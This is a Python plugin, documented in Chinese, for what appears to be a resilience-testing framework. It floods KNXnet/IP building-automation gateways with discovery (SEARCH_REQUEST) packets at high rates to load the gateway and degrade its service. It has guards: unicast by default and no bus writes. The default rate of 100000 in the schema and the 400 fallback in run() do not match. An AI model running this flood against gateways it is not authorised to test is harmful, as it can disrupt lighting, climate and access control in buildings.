"""
測項：KNXnet/IP SEARCH_REQUEST 探索請求洪水
分類：KNX/IP (建築自動化)（UDP 3671，KNXnet/IP 標準埠）
說明：KNXnet/IP 的 SEARCH_REQUEST 是「探索服務」（Discovery，KNX 標準 ISO/IEC 22510 /
KNX Standard 3/8/2 KNXnet/IP 定義）用來讓用戶端尋找網路上的 KNX/IP 介面（介面收到後
會回覆 SEARCH_RESPONSE，內含裝置資訊、支援的服務家族等）。這是完全「無連線」
（connectionless）、不需要任何認證、且**不會觸碰 KNX bus 本身**的機制——閘道器/介面
收到 SEARCH_REQUEST 只是組出裝置描述資料回覆，不會對匯流排上的實際裝置（燈光、
空調、門禁等）送出任何電報。以高頻率重複送出，測試 KNX/IP 介面對探索請求的處理
負荷（CPU/回覆封包產生開銷），是否會因為探索服務被大量請求而影響閘道器對其他
服務（如真正的 Tunnelling 連線）的回應能力。

封包內容（格式信心度說明）：
  - KNXnet/IP 核心標頭（6 bytes）：Header Length(1)=0x06、Protocol Version(1)=0x10、
    Service Type Identifier(2, big-endian)、Total Length(2, big-endian)。
    這個標頭格式是 KNXnet/IP 規範中最基礎、最穩定的部分，也是本模組信心度最高
    （高信心，與公開規格 / Wireshark KNXIP dissector / 多個開源實作如 Calimero、
    knxdclient 揭露的格式一致）的部分。
  - Service Type Identifier：SEARCH_REQUEST = 0x0201（KNXnet/IP Core 服務家族）。
  - Body：一個 HPAI（Host Protocol Address Information）結構（8 bytes）：
    Structure Length(1)=0x08、Host Protocol Code(1)=0x01（IPV4_UDP）、
    IP Address(4)、Port(2, big-endian）——代表「探索回應要送去哪個位址」的
    Discovery Endpoint。
  - 本模組會先對目標建立一個已 connect() 的 UDP socket 取得真正會被路由使用的
    本機來源 IP/Port，填入 HPAI（不使用 0.0.0.0:0 這種依賴伺服器端 NAT 猜測來源
    位址的寫法，降低被判定為異常封包而忽略的機率）。
  - 未涵蓋 KNXnet/IP v2（Extended SEARCH_REQUEST, Service 0x020B, 支援 IPv6/TCP）——
    本測項僅涵蓋原始（v1）SEARCH_REQUEST，這是目前絕大多數 KNX/IP 介面仍支援的
    基礎探索服務。

安全設計（對應框架安全規則）：
  - 純 connectionless UDP 送出，不建立任何連線、不佔用 KNX bus、不送出
    GroupValueWrite 等會改變裝置狀態的電報。
  - 預設僅 unicast 送往框架傳入的 target/port（完全符合「plugin 只能碰觸傳入的
    target/port」的規則），不預設對外廣播/多播。
  - KNX 標準另外定義了探索用的多播位址 224.0.23.12:3671（多台介面同時回覆），
    但送到多播位址會讓「同網段內所有」KNX/IP 介面都回應，等同於觸及框架
    target 之外的第三方裝置，因此本模組**不**預設啟用；如受測環境明確為單一
    隔離網段且使用者已確認網段內裝置均屬本次授權範圍，可透過
    use_standard_multicast 參數手動開啟（比照 BACnet Who-Is 洪水測項的做法，
    開啟前務必確認網段乾淨）。
需求：無額外套件（純標準函式庫 socket + struct）。
"""
from __future__ import annotations

import socket
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "KNXnet/IP SEARCH_REQUEST 探索請求洪水"
CATEGORY = "KNX/IP (建築自動化)"
PROTOCOL = "UDP"
DEFAULT_PORT = 3671
TEST_TYPE = "traffic"  # 流量型：探索請求洪水，靠封包速率造成閘道器負擔

_KNXIP_HEADER_LEN = 0x06
_KNXIP_VERSION_10 = 0x10
_SVC_SEARCH_REQUEST = 0x0201
_SVC_SEARCH_RESPONSE = 0x0202
_HPAI_IPV4_UDP = 0x01
_STANDARD_MULTICAST_ADDR = "224.0.23.12"


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 100000, "min": 1, "max": 100000, "desc": "每秒送出 SEARCH_REQUEST 次數"},
        "use_standard_multicast": {
            "type": "bool", "default": False,
            "desc": "開啟後改送往 KNX 標準探索多播位址 224.0.23.12:3671（會讓同網段所有 KNX/IP 介面回應，"
                    "務必確認網段內裝置均屬本次授權範圍再開啟；預設關閉、僅送往指定 target）",
        },
    }


def _local_endpoint_for(target: str, port: int) -> tuple[str, int]:
    """用『connect() 一個 UDP socket』的常見技巧取得會被作業系統實際選用的來源 IP，
    UDP 的 connect() 只是設定核心層的目的位址/路由快取，不會真的送出任何封包。"""
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((target, port))
        ip, local_port = probe.getsockname()
    except OSError:
        ip, local_port = "0.0.0.0", 0
    finally:
        probe.close()
    return ip, local_port


def _build_hpai(ip: str, port: int) -> bytes:
    try:
        ip_bytes = socket.inet_aton(ip)
    except OSError:
        ip_bytes = b"\x00\x00\x00\x00"
    return bytes([0x08, _HPAI_IPV4_UDP]) + ip_bytes + struct.pack(">H", port)


def _build_search_request(local_ip: str, local_port: int) -> bytes:
    body = _build_hpai(local_ip, local_port)
    total_len = _KNXIP_HEADER_LEN + len(body)
    header = (
        bytes([_KNXIP_HEADER_LEN, _KNXIP_VERSION_10])
        + struct.pack(">H", _SVC_SEARCH_REQUEST)
        + struct.pack(">H", total_len)
    )
    return header + body


def run(target, port, protocol, duration, params, stop_event, log_fn) -> dict:
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 400))
    use_multicast = bool(params.get("use_standard_multicast", False))

    dest_addr = _STANDARD_MULTICAST_ADDR if use_multicast else target
    dest_port = port or DEFAULT_PORT

    local_ip, local_port = _local_endpoint_for(target, dest_port)
    pkt = _build_search_request(local_ip, local_port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if use_multicast:
        # TTL 限制在小範圍內（KNX 探索多播本來就只在區網內使用），並警示此模式會
        # 觸及 target 以外、同網段內的其他 KNX/IP 介面。
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 8)
        log_fn(f"[!] 已啟用標準多播探索模式，將送往 {dest_addr}:{dest_port}（同網段所有 KNX/IP 介面都會回應，"
               f"請確認網段內裝置均屬本次授權範圍）")
    sock.setblocking(False)

    limiter = RateLimiter(rate)
    sent, responses, errors = 0, 0, 0
    start = time.time()

    log_fn(f"[+] KNXnet/IP SEARCH_REQUEST 洪水 -> {dest_addr}:{dest_port} @ {rate}/s, {duration}s"
           f"（Discovery Endpoint 回覆位址：{local_ip}:{local_port}）")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sock.sendto(pkt, (dest_addr, dest_port))
            sent += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")

        # 順便非阻塞地收一下 SEARCH_RESPONSE，純粹統計用途，不影響送出速率
        try:
            while True:
                data, _addr = sock.recvfrom(1024)
                if len(data) >= 4 and struct.unpack(">H", data[2:4])[0] == _SVC_SEARCH_RESPONSE:
                    responses += 1
        except BlockingIOError:
            pass
        except OSError:
            pass

    sock.close()
    elapsed = time.time() - start
    log_fn(f"[+] 完成，送出 {sent} 個 SEARCH_REQUEST，收到 SEARCH_RESPONSE {responses} 次，錯誤 {errors} 次")
    return {
        "requests_sent": sent,
        "responses": responses,
        "errors": errors,
        "elapsed_sec": round(elapsed, 1),
        "multicast_used": use_multicast,
    }
